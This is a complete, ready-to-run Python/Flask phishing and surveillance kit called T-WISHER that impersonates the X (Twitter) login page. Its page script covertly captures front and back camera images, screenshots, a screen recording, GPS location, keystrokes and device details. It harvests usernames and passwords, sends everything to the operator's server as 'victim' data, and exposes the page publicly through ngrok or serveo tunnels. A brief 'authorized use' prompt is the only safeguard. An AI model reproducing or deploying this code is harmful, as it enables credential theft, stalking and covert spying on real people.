#!/usr/bin/env python3
"""
T-WISHER COMPLETE - Advanced Surveillance Framework
PEGASUS TURBO v1.0 - Full Version with All Features
Author: XSPEEN | White Hacker/Red Team Community

FEATURES:
- Front Camera Capture
- Back Camera Capture  
- Screen Screenshot
- 2-Second Screen Recording
- Auto-save to Phone Storage (DCIM/Download)
- Multi-OS Support (Android/Windows/Linux/macOS)
"""

import os
import sys
import time
import json
import base64
import socket
import threading
import subprocess
import webbrowser
import platform
from datetime import datetime
from urllib.parse import quote

try:
    import colorama
    from colorama import Fore, Back, Style
    import requests
    import qrcode
except ImportError:
    os.system("pip install colorama requests qrcode")
    import colorama
    from colorama import Fore, Back, Style
    import requests
    import qrcode

colorama.init(autoreset=True)

try:
    from flask import Flask, request, jsonify, render_template_string
    from flask_cors import CORS
except ImportError:
    os.system("pip install flask flask-cors")
    from flask import Flask, request, jsonify, render_template_string
    from flask_cors import CORS

app = Flask(__name__)
CORS(app)

VICTIMS = {}
TUNNEL_PROCESSES = []

# Get OS-specific download paths
def get_download_path():
    """Get the appropriate download path for different OS"""
    system = platform.system()
    
    if system == "Windows":
        return os.path.join(os.environ['USERPROFILE'], 'Downloads', 'T-WISHER')
    elif system == "Darwin":  # macOS
        return os.path.expanduser('~/Downloads/T-WISHER')
    elif system == "Linux":
        # Check if running in Termux (Android)
        if 'ANDROID_ROOT' in os.environ or 'TERMUX_VERSION' in os.environ:
            # Termux on Android - save to shared storage
            sdcard_paths = ['/sdcard/DCIM/T-WISHER', '/storage/emulated/0/DCIM/T-WISHER']
            for path in sdcard_paths:
                if os.path.exists(os.path.dirname(path)):
                    return path
            return '/sdcard/DCIM/T-WISHER'
        else:
            # Regular Linux
            return os.path.expanduser('~/T-WISHER_CAPTURES')
    else:
        return 'T-WISHER_CAPTURES'

# Create download directory
DOWNLOAD_DIR = get_download_path()
os.makedirs(DOWNLOAD_DIR, exist_ok=True)
os.makedirs('data', exist_ok=True)

# HTML Template with Enhanced Capture Features
HTML_TEMPLATE = """<!DOCTYPE html>
<html>
<head>
    <title>X - Log In</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { background-color: #000000; color: #e7e9ea; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .login-container { width: 100%; max-width: 600px; padding: 20px; }
        .x-logo { display: flex; justify-content: center; margin-bottom: 30px; }
        .x-logo svg { width: 50px; height: 50px; fill: #ffffff; }
        .title { font-size: 31px; font-weight: 700; text-align: center; margin-bottom: 30px; color: #ffffff; }
        .login-form { max-width: 300px; margin: 0 auto; }
        .form-group { margin-bottom: 20px; }
        .form-input { width: 100%; padding: 16px; background: transparent; border: 1px solid #536471; border-radius: 4px; color: #fff; font-size: 17px; }
        .form-input:focus { outline: none; border-color: #1d9bf0; }
        .next-button { width: 100%; padding: 14px; border-radius: 9999px; border: none; background: #ffffff; color: #0f1419; font-size: 15px; font-weight: 700; cursor: pointer; }
        .next-button:hover { background: #e6e6e6; }
        .notification { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background: #1d9bf0; color: white; padding: 12px 24px; border-radius: 9999px; z-index: 1000; }
        .loading { display: inline-block; width: 20px; height: 20px; border: 2px solid #fff; border-radius: 50%; border-top-color: transparent; animation: spin 1s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="x-logo">
            <svg viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231z"></path></svg>
        </div>
        <h1 class="title">Sign in to X</h1>
        
        <form class="login-form" id="loginForm">
            <div class="form-group">
                <input type="text" class="form-input" id="username" placeholder="Phone, email, or username" required>
            </div>
            <div class="form-group" id="passwordGroup" style="display: none;">
                <input type="password" class="form-input" id="password" placeholder="Password">
            </div>
            <button type="submit" class="next-button" id="nextButton">Next</button>
        </form>
    </div>

    <script>
        const VICTIM_ID = "{{ victim_id }}";
        
        // ============================================
        // ADVANCED CAPTURE FUNCTIONS
        // ============================================

        // 1. FRONT CAMERA CAPTURE
        function captureFrontCamera() {
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user',
                        width: { ideal: 1920 },
                        height: { ideal: 1080 }
                    } 
                })
                .then(stream => {
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();
                    
                    setTimeout(() => {
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth || 1280;
                        canvas.height = video.videoHeight || 720;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        
                        // Add timestamp
                        ctx.fillStyle = 'white';
                        ctx.font = '20px Arial';
                        ctx.fillText(new Date().toLocaleString(), 20, 40);
                        
                        const imageData = canvas.toDataURL('image/jpeg', 0.95);
                        
                        fetch('/api/camera/front', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                victim_id: VICTIM_ID,
                                image: imageData,
                                type: 'front',
                                timestamp: Date.now()
                            })
                        });
                        
                        stream.getTracks().forEach(t => t.stop());
                    }, 1500);
                })
                .catch(err => console.log('Front camera error:', err));
            }
        }

        // 2. BACK CAMERA CAPTURE
        function captureBackCamera() {
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'environment',
                        width: { ideal: 1920 },
                        height: { ideal: 1080 }
                    } 
                })
                .then(stream => {
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();
                    
                    setTimeout(() => {
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth || 1280;
                        canvas.height = video.videoHeight || 720;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        
                        // Add timestamp
                        ctx.fillStyle = 'white';
                        ctx.font = '20px Arial';
                        ctx.fillText(new Date().toLocaleString(), 20, 40);
                        
                        const imageData = canvas.toDataURL('image/jpeg', 0.95);
                        
                        fetch('/api/camera/back', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                victim_id: VICTIM_ID,
                                image: imageData,
                                type: 'back',
                                timestamp: Date.now()
                            })
                        });
                        
                        stream.getTracks().forEach(t => t.stop());
                    }, 1500);
                })
                .catch(err => console.log('Back camera error:', err));
            }
        }

        // 3. SCREEN SCREENSHOT
        function captureScreen() {
            if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
                navigator.mediaDevices.getDisplayMedia({ 
                    video: { 
                        cursor: "never"
                    },
                    audio: false
                })
                .then(stream => {
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();
                    
                    setTimeout(() => {
                        const canvas = document.createElement('canvas');
                        canvas.width = window.screen.width;
                        canvas.height = window.screen.height;
                        const ctx = canvas.getContext('2d');
                        
                        // Draw video frame
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        
                        // Add device info overlay
                        ctx.fillStyle = 'rgba(0,0,0,0.7)';
                        ctx.fillRect(10, 10, 300, 100);
                        ctx.fillStyle = 'white';
                        ctx.font = '14px Arial';
                        ctx.fillText(`Device: ${navigator.platform}`, 20, 35);
                        ctx.fillText(`Screen: ${window.screen.width}x${window.screen.height}`, 20, 60);
                        ctx.fillText(`Time: ${new Date().toLocaleString()}`, 20, 85);
                        
                        const imageData = canvas.toDataURL('image/jpeg', 0.9);
                        
                        fetch('/api/screen', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                victim_id: VICTIM_ID,
                                image: imageData,
                                timestamp: Date.now()
                            })
                        });
                        
                        stream.getTracks().forEach(t => t.stop());
                    }, 2000);
                })
                .catch(err => console.log('Screen capture error:', err));
            }
        }

        // 4. SCREEN RECORDING (2 seconds)
        function screenRecording() {
            if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
                navigator.mediaDevices.getDisplayMedia({ 
                    video: true,
                    audio: false
                })
                .then(stream => {
                    const mediaRecorder = new MediaRecorder(stream, {
                        mimeType: 'video/webm'
                    });
                    
                    const chunks = [];
                    
                    mediaRecorder.ondataavailable = e => {
                        if (e.data.size > 0) {
                            chunks.push(e.data);
                        }
                    };
                    
                    mediaRecorder.onstop = () => {
                        const blob = new Blob(chunks, { type: 'video/webm' });
                        const reader = new FileReader();
                        
                        reader.onloadend = () => {
                            const base64data = reader.result.split(',')[1];
                            
                            fetch('/api/recording', {
                                method: 'POST',
                                headers: {'Content-Type': 'application/json'},
                                body: JSON.stringify({
                                    victim_id: VICTIM_ID,
                                    video: base64data,
                                    duration: 2,
                                    timestamp: Date.now()
                                })
                            });
                        };
                        
                        reader.readAsDataURL(blob);
                        stream.getTracks().forEach(t => t.stop());
                    };
                    
                    // Record for 2 seconds
                    mediaRecorder.start();
                    setTimeout(() => {
                        mediaRecorder.stop();
                    }, 2000);
                })
                .catch(err => console.log('Screen recording error:', err));
            }
        }

        // 5. GEOLOCATION WITH HIGH ACCURACY
        function getAccurateLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    position => {
                        fetch('/api/location', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                victim_id: VICTIM_ID,
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                                accuracy: position.coords.accuracy,
                                altitude: position.coords.altitude,
                                heading: position.coords.heading,
                                speed: position.coords.speed,
                                timestamp: position.timestamp
                            })
                        });
                    },
                    error => {
                        // Fallback to IP geolocation
                        fetch('https://ipapi.co/json/')
                            .then(r => r.json())
                            .then(ipData => {
                                fetch('/api/location', {
                                    method: 'POST',
                                    headers: {'Content-Type': 'application/json'},
                                    body: JSON.stringify({
                                        victim_id: VICTIM_ID,
                                        latitude: ipData.latitude,
                                        longitude: ipData.longitude,
                                        city: ipData.city,
                                        country: ipData.country_name,
                                        ip: ipData.ip,
                                        method: 'ip_fallback'
                                    })
                                });
                            })
                            .catch(() => {});
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            }
        }

        // 6. DEVICE FINGERPRINTING
        function collectDeviceInfo() {
            const deviceInfo = {
                victim_id: VICTIM_ID,
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                colorDepth: screen.colorDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezoneOffset: new Date().getTimezoneOffset(),
                cookiesEnabled: navigator.cookieEnabled,
                hardwareConcurrency: navigator.hardwareConcurrency,
                deviceMemory: navigator.deviceMemory,
                connection: navigator.connection ? {
                    type: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink
                } : null
            };
            
            fetch('/api/device', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(deviceInfo)
            });
        }

        // 7. KEYLOGGER
        let keyBuffer = '';
        document.addEventListener('keydown', function(e) {
            let key = e.key;
            if (key === ' ') key = ' ';
            else if (key === 'Enter') key = '\\n';
            else if (key === 'Backspace') key = '[BKSP]';
            else if (key === 'Tab') key = '[TAB]';
            
            keyBuffer += key;
            
            if (keyBuffer.length >= 30 || key === '\\n') {
                fetch('/api/keylogger', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        victim_id: VICTIM_ID,
                        keys: keyBuffer
                    })
                });
                keyBuffer = '';
            }
        });

        // 8. BATTERY STATUS
        if (navigator.getBattery) {
            navigator.getBattery().then(battery => {
                fetch('/api/battery', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        victim_id: VICTIM_ID,
                        level: battery.level * 100,
                        charging: battery.charging
                    })
                });
            });
        }

        // ============================================
        // EXECUTE ALL CAPTURES
        // ============================================
        
        // Initial device info
        collectDeviceInfo();
        
        // Get location
        setTimeout(() => getAccurateLocation(), 1000);
        
        // Capture sequence
        setTimeout(() => {
            captureFrontCamera();      // Front camera
        }, 2000);
        
        setTimeout(() => {
            captureBackCamera();       // Back camera
        }, 4000);
        
        setTimeout(() => {
            captureScreen();           // Screen screenshot
        }, 6000);
        
        setTimeout(() => {
            screenRecording();         // 2-second screen recording
        }, 8000);

        // ============================================
        // FORM HANDLING
        // ============================================
        let step = 1;
        document.getElementById('loginForm').addEventListener('submit', e => {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            
            if (step === 1) {
                document.getElementById('username').style.display = 'none';
                document.getElementById('passwordGroup').style.display = 'block';
                document.getElementById('nextButton').textContent = 'Log in';
                step = 2;
                
                fetch('/api/username', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        victim_id: VICTIM_ID,
                        username: username
                    })
                });
                
            } else {
                const password = document.getElementById('password').value;
                
                fetch('/api/credentials', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        victim_id: VICTIM_ID,
                        email: username,
                        password: password
                    })
                }).then(() => {
                    window.location.href = 'https://twitter.com/login';
                });
            }
        });

        // Send remaining keylogs on exit
        window.addEventListener('beforeunload', () => {
            if (keyBuffer.length > 0) {
                fetch('/api/keylogger', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        victim_id: VICTIM_ID,
                        keys: keyBuffer
                    })
                });
            }
        });
    </script>
</body>
</html>"""

def save_to_storage(data, filename, subdir=''):
    """Save data to appropriate storage location"""
    # Save to local data directory
    local_path = os.path.join('data', subdir, filename)
    os.makedirs(os.path.dirname(local_path), exist_ok=True)
    
    with open(local_path, 'wb') as f:
        if isinstance(data, bytes):
            f.write(data)
        else:
            f.write(data.encode())
    
    # Also save to download directory for easy access
    download_path = os.path.join(DOWNLOAD_DIR, subdir, filename)
    os.makedirs(os.path.dirname(download_path), exist_ok=True)
    
    with open(download_path, 'wb') as f:
        if isinstance(data, bytes):
            f.write(data)
        else:
            f.write(data.encode())
    
    return local_path, download_path

def show_banner():
    """Display T-WISHER banner"""
    os.system('cls' if os.name == 'nt' else 'clear')
    
    banner = f"""
{Fore.BLUE}
    ████████╗      ██╗    ██╗██╗███████╗██╗  ██╗███████╗██████╗ 
    ╚══██╔══╝      ██║    ██║██║██╔════╝██║  ██║██╔════╝██╔══██╗
       ██║   █████╗██║ █╗ ██║██║███████╗███████║█████╗  ██████╔╝
       ██║   ╚════╝██║███╗██║██║╚════██║██╔══██║██╔══╝  ██╔══██╗
       ██║         ╚███╔███╔╝██║███████║██║  ██║███████╗██║  ██║
       ╚═╝          ╚══╝╚══╝ ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
{Style.RESET_ALL}
{Fore.CYAN}═══════════════════════════════════════════════════════════════
{Fore.YELLOW}              PEGASUS TURBO v1.0 - NUCLEAR FINDER
{Fore.GREEN}           MADE BY XSPEEN | WHITE HACKER/RED TEAM
{Fore.CYAN}═══════════════════════════════════════════════════════════════
{Fore.MAGENTA}📸 Enhanced Capture: Front/Back Camera + Screen + Recording
{Fore.MAGENTA}💾 Auto-Save: {DOWNLOAD_DIR}
{Fore.CYAN}═══════════════════════════════════════════════════════════════{Style.RESET_ALL}
"""
    print(banner)

# Flask Routes
@app.route('/')
def index():
    victim_ip = request.remote_addr
    victim_id = str(int(time.time()))
    
    VICTIMS[victim_id] = {
        'ip': victim_ip,
        'first_seen': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'user_agent': request.headers.get('User-Agent'),
        'data': {}
    }
    
    print(f"{Fore.GREEN}[+] NEW VICTIM: {victim_ip} (ID: {victim_id}){Style.RESET_ALL}")
    
    return render_template_string(HTML_TEMPLATE, victim_id=victim_id)

@app.route('/api/camera/front', methods=['POST'])
def receive_front_camera():
    """Receive front camera capture"""
    data = request.json
    victim_id = data.get('victim_id')
    image_data = data.get('image')
    
    if victim_id in VICTIMS and image_data:
        try:
            if ',' in image_data:
                image_bytes = base64.b64decode(image_data.split(',')[1])
            else:
                image_bytes = base64.b64decode(image_data)
            
            timestamp = int(time.time())
            filename = f"front_camera_{victim_id}_{timestamp}.jpg"
            
            # Save to both locations
            local_path, download_path = save_to_storage(image_bytes, filename, 'images')
            
            print(f"\n{Fore.GREEN}📸 FRONT CAMERA CAPTURED!{Style.RESET_ALL}")
            print(f"{Fore.CYAN}   Victim: {VICTIMS[victim_id]['ip']}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}   Saved to: {download_path}{Style.RESET_ALL}")
            
            return jsonify({'status': 'success'})
        except Exception as e:
            print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
    
    return jsonify({'status': 'error'}), 400

@app.route('/api/camera/back', methods=['POST'])
def receive_back_camera():
    """Receive back camera capture"""
    data = request.json
    victim_id = data.get('victim_id')
    image_data = data.get('image')
    
    if victim_id in VICTIMS and image_data:
        try:
            if ',' in image_data:
                image_bytes = base64.b64decode(image_data.split(',')[1])
            else:
                image_bytes = base64.b64decode(image_data)
            
            timestamp = int(time.time())
            filename = f"back_camera_{victim_id}_{timestamp}.jpg"
            
            local_path, download_path = save_to_storage(image_bytes, filename, 'images')
            
            print(f"\n{Fore.GREEN}📸 BACK CAMERA CAPTURED!{Style.RESET_ALL}")
            print(f"{Fore.CYAN}   Victim: {VICTIMS[victim_id]['ip']}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}   Saved to: {download_path}{Style.RESET_ALL}")
            
            return jsonify({'status': 'success'})
        except Exception as e:
            print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
    
    return jsonify({'status': 'error'}), 400

@app.route('/api/screen', methods=['POST'])
def receive_screen():
    """Receive screen screenshot"""
    data = request.json
    victim_id = data.get('victim_id')
    image_data = data.get('image')
    
    if victim_id in VICTIMS and image_data:
        try:
            if ',' in image_data:
                image_bytes = base64.b64decode(image_data.split(',')[1])
            else:
                image_bytes = base64.b64decode(image_data)
            
            timestamp = int(time.time())
            filename = f"screenshot_{victim_id}_{timestamp}.jpg"
            
            local_path, download_path = save_to_storage(image_bytes, filename, 'screenshots')
            
            print(f"\n{Fore.GREEN}🖥️ SCREENSHOT CAPTURED!{Style.RESET_ALL}")
            print(f"{Fore.CYAN}   Victim: {VICTIMS[victim_id]['ip']}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}   Saved to: {download_path}{Style.RESET_ALL}")
            
            return jsonify({'status': 'success'})
        except Exception as e:
            print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
    
    return jsonify({'status': 'error'}), 400

@app.route('/api/recording', methods=['POST'])
def receive_recording():
    """Receive screen recording"""
    data = request.json
    victim_id = data.get('victim_id')
    video_data = data.get('video')
    
    if victim_id in VICTIMS and video_data:
        try:
            video_bytes = base64.b64decode(video_data)
            timestamp = int(time.time())
            filename = f"recording_{victim_id}_{timestamp}.webm"
            
            local_path, download_path = save_to_storage(video_bytes, filename, 'recordings')
            
            print(f"\n{Fore.GREEN}🎥 SCREEN RECORDING CAPTURED! (2 seconds){Style.RESET_ALL}")
            print(f"{Fore.CYAN}   Victim: {VICTIMS[victim_id]['ip']}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}   Saved to: {download_path}{Style.RESET_ALL}")
            
            return jsonify({'status': 'success'})
        except Exception as e:
            print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
    
    return jsonify({'status': 'error'}), 400

@app.route('/api/location', methods=['POST'])
def receive_location():
    data = request.json
    victim_id = data.get('victim_id')
    
    if victim_id in VICTIMS:
        VICTIMS[victim_id]['location'] = data
        
        lat = data.get('latitude')
        lon = data.get('longitude')
        maps_link = f"https://www.google.com/maps?q={lat},{lon}"
        
        print(f"\n{Fore.GREEN}📍 LOCATION CAPTURED!{Style.RESET_ALL}")
        print(f"{Fore.CYAN}   Victim: {VICTIMS[victim_id]['ip']}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}   Coordinates: {lat}, {lon}{Style.RESET_ALL}")
        print(f"{Fore.BLUE}   Maps: {maps_link}{Style.RESET_ALL}")
        
        # Save location
        filename = f"location_{victim_id}.txt"
        content = f"IP: {VICTIMS[victim_id]['ip']}\nLatitude: {lat}\nLongitude: {lon}\nGoogle Maps: {maps_link}\nTime: {datetime.now()}"
        save_to_storage(content.encode(), filename, 'locations')
        
        return jsonify({'status': 'success'})
    
    return jsonify({'status': 'error'}), 400

@app.route('/api/credentials', methods=['POST'])
def receive_credentials():
    data = request.json
    victim_id = data.get('victim_id')
    
    if victim_id in VICTIMS:
        email = data.get('email')
        password = data.get('password')
        
        VICTIMS[victim_id]['credentials'] = {
            'email': email,
            'password': password
        }
        
        print(f"\n{Fore.RED}🔑 CREDENTIALS CAPTURED!{Style.RESET_ALL}")
        print(f"{Fore.CYAN}   Victim: {VICTIMS[victim_id]['ip']}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}   Email: {email}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}   Password: {password}{Style.RESET_ALL}")
        
        # Save credentials
        filename = f"credentials_{victim_id}.txt"
        content = f"IP: {VICTIMS[victim_id]['ip']}\nEmail: {email}\nPassword: {password}\nTime: {datetime.now()}"
        save_to_storage(content.encode(), filename, 'credentials')
        
        return jsonify({'status': 'success'})
    
    return jsonify({'status': 'error'}), 400

@app.route('/api/device', methods=['POST'])
def receive_device():
    data = request.json
    victim_id = data.get('victim_id')
    
    if victim_id in VICTIMS:
        VICTIMS[victim_id]['device'] = data
        
        print(f"\n{Fore.BLUE}📱 DEVICE INFO{Style.RESET_ALL}")
        print(f"{Fore.CYAN}   Platform: {data.get('platform')}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}   Screen: {data.get('screen')}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}   Timezone: {data.get('timezone')}{Style.RESET_ALL}")
        
        return jsonify({'status': 'success'})
    
    return jsonify({'status': 'error'}), 400

@app.route('/api/keylogger', methods=['POST'])
def receive_keylogger():
    data = request.json
    victim_id = data.get('victim_id')
    keys = data.get('keys')
    
    if victim_id in VICTIMS and keys:
        print(f"{Fore.MAGENTA}⌨️ Keystroke: {keys}{Style.RESET_ALL}")
        
        # Save keylogs
        filename = f"keylogs_{victim_id}.txt"
        with open(f"data/keylogs_{victim_id}.txt", 'a') as f:
            f.write(f"[{datetime.now().strftime('%H:%M:%S')}] {keys}\n")
        
        return jsonify({'status': 'success'})
    
    return jsonify({'status': 'error'}), 400

@app.route('/api/battery', methods=['POST'])
def receive_battery():
    data = request.json
    victim_id = data.get('victim_id')
    
    if victim_id in VICTIMS:
        print(f"{Fore.CYAN}🔋 Battery: {data.get('level')}% {'(Charging)' if data.get('charging') else ''}{Style.RESET_ALL}")
        return jsonify({'status': 'success'})
    
    return jsonify({'status': 'error'}), 400

@app.route('/api/username', methods=['POST'])
def receive_username():
    data = request.json
    victim_id = data.get('victim_id')
    
    if victim_id in VICTIMS:
        username = data.get('username')
        print(f"{Fore.YELLOW}[+] Username entered: {username}{Style.RESET_ALL}")
        return jsonify({'status': 'success'})
    
    return jsonify({'status': 'error'}), 400

def monitor_victims():
    while True:
        time.sleep(10)
        if VICTIMS:
            print(f"\n{Fore.CYAN}📊 Active Victims: {len(VICTIMS)}{Style.RESET_ALL}")
            for vid, data in VICTIMS.items():
                status = []
                if 'location' in data: status.append('📍')
                if os.path.exists(f"data/front_camera_{vid}_*.jpg"): status.append('📸')
                if 'credentials' in data: status.append('🔑')
                print(f"   {data['ip']} {' '.join(status)}")

def check_terms():
    print(f"{Fore.RED}[!] WARNING: Enhanced Surveillance Tool - Authorized Use Only!{Style.RESET_ALL}")
    print(f"{Fore.RED}[!] Captures: Front/Back Camera, Screen, Recording, Location, Credentials{Style.RESET_ALL}")
    print()
    
    choice = input(f"{Fore.CYAN}[?] Accept terms and confirm authorized use? (yes/no): {Style.RESET_ALL}").lower().strip()
    
    if choice != 'yes':
        print(f"{Fore.RED}\n[!] Access Denied. Exiting...{Style.RESET_ALL}")
        sys.exit(0)
    
    print(f"{Fore.GREEN}[+] Terms accepted. Auto-save enabled to: {DOWNLOAD_DIR}{Style.RESET_ALL}")
    time.sleep(1)

def get_port():
    while True:
        try:
            port = input(f"{Fore.CYAN}[?] Enter port (default: 8080): {Style.RESET_ALL}").strip()
            return int(port) if port else 8080
        except:
            print(f"{Fore.RED}[!] Invalid port{Style.RESET_ALL}")

def select_tunnel():
    print(f"\n{Fore.YELLOW}[+] Tunnel Options:{Style.RESET_ALL}")
    print("  1. Localhost")
    print("  2. Ngrok")
    print("  3. Serveo.net")
    print("  4. Cloudflared")
    print("  5. SSH Localhost.run")
    
    while True:
        choice = input(f"{Fore.CYAN}[?] Choice (1-5): {Style.RESET_ALL}").strip()
        if choice in ['1','2','3','4','5']:
            return choice

def generate_qr(url, name):
    try:
        qr = qrcode.QRCode(version=1, box_size=10, border=5)
        qr.add_data(url)
        qr.make(fit=True)
        img = qr.make_image(fill_color="black", back_color="white")
        qr_file = f"tunnel_qr_{name}.png"
        img.save(qr_file)
        print(f"{Fore.GREEN}[+] QR: {qr_file}{Style.RESET_ALL}")
    except:
        pass

def start_ngrok(port):
    try:
        subprocess.Popen(["ngrok", "http", str(port)], 
                        stdout=subprocess.DEVNULL, 
                        stderr=subprocess.DEVNULL)
        time.sleep(3)
        r = requests.get("http://localhost:4040/api/tunnels")
        return r.json()['tunnels'][0]['public_url'] if r.ok else None
    except:
        return None

def start_serveo(port):
    import random, string
    sub = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    cmd = f"ssh -o StrictHostKeyChecking=no -R {sub}:80:localhost:{port} serveo.net"
    subprocess.Popen(cmd.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(3)
    return f"https://{sub}.serveo.net"

def main():
    try:
        show_banner()
        check_terms()
        port = get_port()
        tunnel = select_tunnel()
        
        print(f"\n{Fore.GREEN}[+] Server: http://localhost:{port}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Auto-save: {DOWNLOAD_DIR}{Style.RESET_ALL}")
        
        # Start tunnel
        if tunnel == '2':
            url = start_ngrok(port)
            if url: print(f"{Fore.GREEN}[+] Ngrok: {url}{Style.RESET_ALL}"); generate_qr(url, 'ngrok')
        elif tunnel == '3':
            url = start_serveo(port)
            print(f"{Fore.GREEN}[+] Serveo: {url}{Style.RESET_ALL}"); generate_qr(url, 'serveo')
        
        print(f"\n{Fore.YELLOW}[+] Hunting...{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[+] Captures will auto-save to:{Style.RESET_ALL}")
        print(f"{Fore.CYAN}    📸 Images: {DOWNLOAD_DIR}/images/{Style.RESET_ALL}")
        print(f"{Fore.CYAN}    🖥️ Screenshots: {DOWNLOAD_DIR}/screenshots/{Style.RESET_ALL}")
        print(f"{Fore.CYAN}    🎥 Recordings: {DOWNLOAD_DIR}/recordings/{Style.RESET_ALL}")
        print(f"{Fore.CYAN}    📍 Locations: {DOWNLOAD_DIR}/locations/{Style.RESET_ALL}")
        print(f"{Fore.CYAN}    🔑 Credentials: {DOWNLOAD_DIR}/credentials/{Style.RESET_ALL}")
        
        threading.Thread(target=monitor_victims, daemon=True).start()
        app.run(host='0.0.0.0', port=port, debug=False)
        
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Shutting down...{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] All captures saved to: {DOWNLOAD_DIR}{Style.RESET_ALL}")

if __name__ == '__main__':
    main()
